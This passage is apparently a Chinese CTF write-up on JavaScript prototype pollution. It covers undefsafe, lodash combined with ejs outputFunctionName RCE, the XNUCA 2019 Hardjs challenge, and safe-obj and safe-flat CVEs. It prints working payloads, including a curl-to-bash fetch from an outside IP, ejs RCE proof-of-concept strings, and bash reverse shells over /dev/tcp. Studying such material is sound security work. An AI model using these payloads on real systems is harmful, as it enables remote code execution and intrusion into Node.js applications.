      console.error(err.stack);
      res.status(500).send('Something broke!');
    });
    const port = 8080;
    app.listen(port, () => console.log(`Example app listening at http://localhost:${port}`))
我们注意到其使用了 undefsafe 模块，那么如果我们可以操纵其第 2、3 个参数，即可进行原型链污染，则可使目标网站存在风险。故此，我们首先要寻找
undefsafe 的调用点：
    get_note(id) {
        var r = {}
        undefsafe(r, id, undefsafe(this.note_list, id));
        return r;
    }
    edit_note(id, author, raw) {
        undefsafe(this.note_list, id + '.author', author);
        undefsafe(this.note_list, id + '.raw_note', raw);
    }
这里的r是个空的属性，是很显然是比较容易利用的，同时再查看和编辑note的时候还调用了undefsafe方法，那我们下一步就看看get_note在哪里会被调用
    app.route('/notes')
        .get(function(req, res) {
            let q = req.query.q;
            let a_note;
            if (typeof(q) === "undefined") {
                a_note = notes.get_all_notes();
            } else {
                a_note = notes.get_note(q);
            }
            res.render('note', {list: a_note});
        })
这个路由主要就是用来查看notes的，当我们指定一个q，也就是指定一个查看的note时，就会调用get_note
既然q是我们可以指定的，也就说明他是一个可控的参数，但这样只能控制undefsafe得第二个参数而已，而第三个参数我们无法控制
但在`/edit_note`路由中存在一个`edit_note`的方法
    app.route('/edit_note')
        .get(function(req, res) {
            res.render('mess', {message: "please use POST to edit a note"});
        })
        .post(function(req, res) {
            let id = req.body.id;
            let author = req.body.author;
            let enote = req.body.raw;
            if (id && author && enote) {
                notes.edit_note(id, author, enote);
                res.render('mess', {message: "edit note sucess"});
            } else {
                res.render('mess', {message: "edit note failed"});
            }
        })
此时的`id, author, enote`三个参数都是可控的参数，那么我们则可以操纵原型链进行污染
    edit_note(id, author, raw) {
            undefsafe(this.note_list, id + '.author', author);
            undefsafe(this.note_list, id + '.raw_note', raw);
        }
那么既然找到了可以进行原型链污染的位置，就要查找何处可以利用污染的值造成攻击，我们依次查看路由，发现 `/status` 路由有命令执行的操作：
    app.route('/status')    // 漏洞点，只要将字典commands给污染了，就能执行我们的任意命令
        .get(function(req, res) {
            let commands = {
                "script-1": "uptime",
                "script-2": "free -m"
            };
            for (let index in commands) {
                exec(commands[index], {shell:'/bin/bash'}, (err, stdout, stderr) => {
                    if (err) {
                        return;
                    }
                    console.log(`stdout: ${stdout}`);    // 将命令执行结果输出
                });
            }
            res.send('OK');
            res.end();
        })
那我们的思路就来了，我们可以通过`/edit_note` 路由污染`note_list`对象的原型，比如加入某个命令，由于 `commands` 和
`note_list` 都继承自同一个原型，那么在遍历 `commands` 时便会取到我们污染进去的恶意命令并执行。
在服务器上面创建一个反弹 Shell 的文件，然后等待目标主机去 Curl 访问并执行他：
在目标主机执行 Payload：
    id=__proto__.a&author=curl http://1.15.75.117/shell.txt|bash&raw=a;
再访问 /status 路由，利用污染后的结果进行命令执行，成功反弹 Shell 并得到 flag
## Lodash配合ejs模板引擎实现 RCE CVE-2022-29078
Nodejs 的 ejs 模板引擎存在一个利用原型污染进行 RCE 的一个漏洞。但要实现 RCE，首先需要有原型链污染，这里我们暂且使用
lodash.merge 方法中的原型链污染漏洞。
    var express = require('express');
    var lodash = require('lodash');
    var ejs = require('ejs');
    var app = express();
    //设置模板的位置与种类
    app.set('views', __dirname);
    app.set('views engine','ejs');
    //对原型进行污染
    var malicious_payload = '{"__proto__":{"outputFunctionName":"_tmp1;global.process.mainModule.require(\'child_process\').exec(\'calc\');var __tmp2"}}';
    lodash.merge({}, JSON.parse(malicious_payload));
    //进行渲染
    app.get('/', function (req, res) {
        res.render ("index.ejs",{
            message: 'sp4c1ous'
        });
    });
    //设置http
    var server = app.listen(8000, function () {
        var host = server.address().address
        var port = server.address().port
        console.log("应用实例，访问地址为 http://%s:%s", host, port)
    });
index.ejs
对原型链进行污染的部分就是这里的`lodash.merge` 操作，我们通过对 `outputFunctionName` 进行 原型链污染 后的赋值来实现
RCE ，语句为
    "outputFunctionName":"_tmp1;global.process.mainModule.require(\'child_process\').exec(\'cat /flag\');var __tmp2"
下面我们开始分析。
我们从 index.js::res.render 处开始，跟进 render 方法：
跟进到 app.render 方法：
发现最终会进入到 app.render 方法里的 tryRender 函数，跟进到 tryRender：
调用了 `view.render` 方法，继续跟进 `view.render` ：
至此调用了 `engine`，也就是说从这里进入到了模板渲染引擎 `ejs.js` 中。跟进 `ejs.js` 中的 renderFile 方法：
发现 renderFile 中又调用了`tryHandleCache`方法，跟进`tryHandleCache`：
进入到 handleCache 方法，跟进 handleCache：
在 handleCache 中找到了渲染模板的 compile 方法，跟进 compile：
找到了我们要找的`outputFunctionName`
发现在 compile 中存在大量的渲染拼接。这里将 `opts.outputFunctionName` 拼接到 prepended 中，prepended
在最后会被传递给 this.source 并被带入函数执行。所以如果我们能够污染 `opts.outputFunctionName`，就能将我们构造的
payload 拼接进 js 语句中，并在 ejs 渲染时进行 RCE。在 ejs 中还有一个 `render` 方法，其最终也是进入了
`compile`。最后给出几个 ejs 模板引擎 RCE 常用的 POC：
    {"__proto__":{"outputFunctionName":"_tmp1;global.process.mainModule.require(\'child_process\').execSync('calc');var __tmp2"}}
    {"__proto__":{"outputFunctionName":"_tmp1;global.process.mainModule.require(\'child_process\').exec('calc');var __tmp2"}}
    {"__proto__":{"outputFunctionName":"_tmp1;global.process.mainModule.require('child_process').exec('bash -c \"bash -i >& /dev/tcp/xxx/6666 0>&1\"');var __tmp2"}}
### [XNUCA 2019 Qualifier]Hardjs
  * `/` 首页
  * `/static` 静态文件
  * `/sandbox` 显示用户HTML数据用的沙盒
  * `/login` 登陆
  * `/register` 注册
  * `/get` json接口 获取数据库中保存的数据
  * `/add` 用户添加数据的接口
除了`/static`，`/login`和`/register`以外，所有路由在访问的时候都会经过一个`auth`函数进行身份验证
另外在初始化的时候有这么一句
    app.use(bodyParser.urlencoded({extended: true})).use(bodyParser.json())
所以我们可以通过json格式传递参数到服务端
发现调用了 lodash ，而且版本4.17.11
    {
      "name": "htmlstore",
      "version": "1.0.0",
      "description": "htmlStore will help you store html file.",
      "main": "server.js",
      "scripts": {
        "test": "echo \"Error: no test specified\" && exit 1"
      },
      "author": "",
      "license": "ISC",
      "dependencies": {
        "ejs": "^2.6.2",
        "express": "^4.17.1",
        "express-session": "^1.16.2",
        "helmet": "^3.19.0",
        "lodash": "4.17.11",
        "mongodb": "^3.3.0-beta2",
        "mysql": "^2.17.1",
        "randomatic": "^3.1.1"
      }
    }
估计存在原型链污染漏洞，发现调用 lodash.defaultDeep 函数，
在`/get`中我们可以发现，查询出来的结果，如果超过5条，那么会被合并成一条。具体的过程是，先通过sql查询出来当前用户所有的数据，然后一条条合并到一起
相关的从express到ejs的利用连上面写了，不写了。
最终还是
    if (opts.outputFunctionName) {
            prepended += '  var ' + opts.outputFunctionName + ' = __append;' + '\n';
          }
这里的 `outputFunctionName`
这个参数未定义，并且被拼接入一路回传给`prepended`，`this.source`，`src`，`fn`，然后以`returnedFn`返回并最后被执行。
而一路跟进的时候可以发现，并没有`outputFunctionName`的身影，所以只要给 Object
的`prototype`加上这个成员，我们就可以实现从原型链污染到RCE的攻击过程了！
payload
    {
        "content": {
            "constructor": {
                "prototype": {
                "outputFunctionName":"_tmp1;global.process.mainModule.require('child_process').exec('bash -c \"bash -i >& /dev/tcp/1.15.75.117/2333 0>&1\"');var __tmp2"
                }
            }
        },
        "type": "test"
    }
发送6次请求，然后访问`/get`进行原型链污染，最后访问`/`或`/login`触发`render`函数，成功反弹shell并 getflag
## safe-obj模块原型链污染
翻译很硬，没大看明白，这个模块需要lodash，但可以依稀的看出来这个模块是针对空对象的，也就是`{}`
### CVE-2021-25928
POC
    var safeObj = require("safe-obj");
    var obj = {};
    console.log("Before : " + {}.polluted);
    safeObj.expand(obj, '__proto__.polluted', 'Yes! Its Polluted');
    console.log("After : " + {}.polluted);
我们在`safeObj.expand(obj, '__proto__.polluted', 'Yes! Its
Polluted');`处下个断点，单步执行结束后可以看到
可以看到成功在原型中添加了属性
分析一下
查看safe-objv1.0.0中lib/index.js中的extend函数定义如下。
首先我们传入的一定是一个对象，然后他也可以接收`{}`，满足条件进入第二个循环
第一次调用expand函数，传参如下。
    obj = {},path = "__proto__.polluted",thing = "Yes! Its Polluted"
执行`split('.')`函数后，props数组值如下，此时进入else分支。
    props = (2) ["__proto__","polluted"],path = "__proto__.polluted"
执行prop.shift()语句后，prop的值如下。
    prop = "__proto__",props = ["polluted"]
    obj = {}
这样就跳过了if判断，递归调用expand
相当于执行
    expand(obj[__proto__]，"polluted","Yes! Its Polluted")
再次调用`split(''.')`后,
`props`的值为`”polluted”`。`props.length===1`结果为`true`，
执行`obj[props.shift()]=thing`，
    props = ["polluted"], path = "polluted"
相当于执行`obj[__proto__]["polluted"]="Yes! Its Polluted"`，造成原型污染。
### CVE-2021-25927
该漏洞存在于safe-flat，v2.0.0~v2.0.1版本中，POC如下：
    var safeFlat = require("safe-flat");
    console.log("Before : " + {}.polluted);
    safeFlat.unflatten({"__proto__.polluted": "Yes! Its Polluted"}, '.');
    console.log("After : " + {}.polluted);